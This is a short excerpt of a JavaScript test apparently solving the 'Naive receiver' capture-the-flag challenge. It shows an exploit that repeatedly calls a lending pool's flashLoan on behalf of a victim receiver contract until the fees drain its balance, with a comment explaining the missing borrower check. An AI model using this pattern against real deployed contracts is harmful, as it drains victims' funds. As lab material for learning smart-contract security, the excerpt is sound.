...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    /*flashLoan doesn't check if msg.sender == borrower. Therefor anyone could
    take loan for arbitrary address, and as a result this arbitrary address
    has to pay the fee. */
    let fee = this.pool.fixedFee();
    while (true) {
      await this.pool.connect(attacker).flashLoan(this.receiver.address, fee);
      if ((await ethers.provider.getBalance(this.receiver.address)) == 0) {
        break;
      }
    }
  });
